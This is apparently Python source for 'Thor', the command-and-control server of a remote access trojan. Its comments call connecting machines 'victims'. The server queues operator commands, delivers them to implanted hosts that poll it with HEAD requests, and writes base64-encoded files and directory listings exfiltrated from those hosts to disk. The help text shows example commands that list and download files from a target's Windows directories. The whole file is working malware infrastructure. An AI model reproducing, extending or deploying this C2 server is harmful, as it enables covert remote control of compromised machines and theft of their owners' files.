import base64
import os

from CONST import *
from http.server import BaseHTTPRequestHandler, HTTPServer
from IPy import IP
import logging
import threading
import sys


class Thor(BaseHTTPRequestHandler):
    all_connections = {}

    def log_message(self, format, *args):
        """ overrides BaseHTTPRequestHandler.log_message method to avoid printing header """
        return

    def do_HEAD(self):
        """
        this function operates whenever the target sends HEAD request to the server
        check if victim is connected to server, and send the command
         """
        client_ip = str(self.client_address[0])
        # print(f'{client_ip} has connected to the server')
        logging.info(f'{client_ip} has connected to the server')
        if client_ip in Thor.all_connections.keys():
            try:
                self.send_response(200, message=Thor.all_connections[client_ip])
                self.end_headers()
                logging.info(f'command: {Thor.all_connections[client_ip]} sent to target:{client_ip}')
            except Exception as e:
                logging.error(f'error sending command to target: {e}')
            del Thor.all_connections[client_ip]
        else:
            try:
                self.send_response(204, message='')
                self.end_headers()
            except Exception as e:
                logging.error(f'error sending response to target: {e}')

    def do_GET(self):
        pass

    def do_POST(self):
        """
        this function operates whenever the target sends POST request to the server
        The victim will send the appropriate results according to the command sent
        """
        if self.path == 'download':
            with open(VICTIMS_FILES_PATH, 'wb') as f:
                f.write(base64.b64decode(self.rfile.read()))
        if self.path == 'dir':
            with open(DIRLIST_PATH, 'wb') as f:
                f.write(base64.b64decode(self.rfile.read()))

    @staticmethod
    def validate_command(command):
        """
        check if the command is valid
        :param command: string
        """
        command_args = None
        command = command.split(' ', 2)
        if len(command) < 2:
            # the minimum valid len(command) can be 2
            logging.error('command is not valid')
            Thor.show_help()
            return None, None, None
        elif len(command) > 2:
            # command args given, validate the args
            try:
                command_args = command[2].split('"')[1::2]
                if command[1] == 'dir' and len(command_args) != 1:
                    # dir command was given but the number of argument given is invalid
                    raise Exception
            except Exception as e:
                print(e)
                logging.error('command argument not valid')
                Thor.show_help()
                return None, None, None
        if Thor.is_ip_address(command[0]):
            # the IP address given is valid
            client_address = command[0]
        else:
            Thor.show_help()
            return None, None, None
        if Thor.is_allowed_command(command[1]):
            # the command is valid
            cmd = command[1]
        else:
            logging.error('command is not valid')
            Thor.show_help()
            return None, None, None
        return client_address, cmd, command_args

    @staticmethod
    def is_allowed_command(command):
        """
        returns True if command is valid, else False
        :param command: string
        :return: boolean
        """
        return True if command in ALLOWED_COMMANDS else False

    @staticmethod
    def is_ip_address(ip):
        """
        returns True if IP is valid, else False
        :param ip: string
        :return: boolean
        """
        try:
            IP(ip)
            return True
        except ValueError:
            logging.error(f'{ip} is not a valid IP address')
            print(f'{ip} is not a valid IP address')
            return False

    @classmethod
    def send_commands(cls):
        """
        waiting for commands, and organizing them in the all_connections dict
        """
        Thor.banner()
        Thor.show_help()
        try:
            while True:
                prompt = input('\n> ')
                client_address, cmd, command_args = Thor.validate_command(prompt)
                if client_address and cmd and command_args:
                    cls.all_connections[client_address] = [cmd] + command_args
                else:
                    continue
        except EOFError:
            print('quitting gracefully')
            sys.exit(0)

    @staticmethod
    def create_output_dirs(OUTPUT_DIR):
        if not os.path.exists(os.path.split(OUTPUT_DIR)[0]):
            os.makedirs(os.path.split(OUTPUT_DIR)[0])

    @staticmethod
    def banner():
        """
        prints that amazing banner
        """
        print(
            """
████████╗██╗  ██╗ ██████╗ ██████╗ 
╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
   ██║   ███████║██║   ██║██████╔╝
   ██║   ██╔══██║██║   ██║██╔══██╗
   ██║   ██║  ██║╚██████╔╝██║  ██║
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
            """
        )

    @staticmethod
    def show_help():
        """
        prints the available commands, including descriptions and examples
        :return:
        """
        print('\nusage: IP COMMAND [ARGS]\t(whitespaces between each word)')
        print('\tsupported commands:')
        print('\t* dir [path] - show all files and dirs in given path')
        print('\t* download [path] [path] ... - download the paths given (can take one or more paths)')
        # print('\t* process-list - show target process list')
        # print('\t* screenshot - take screenshot and save it to servers screenshots directory')
        print('\n\texamples:')
        print('\t173.121.5.83 download "c:\\windows\\iis.log" "c:\\windows\\example.txt"')
        # print('\t173.121.5.83 screenshot')
        print('\t173.121.5.83 dir "c:\\windows"')


def main():
    global server
    logging.basicConfig(filename=r'thor_logs.log', format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)
    Thor.create_output_dirs(OUTPUT_DIR)
    server = HTTPServer((HOST, PORT), Thor)
    t = threading.Thread(target=Thor.send_commands)
    t.daemon = True
    t.start()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.socket.close()


if __name__ == '__main__':
    main()
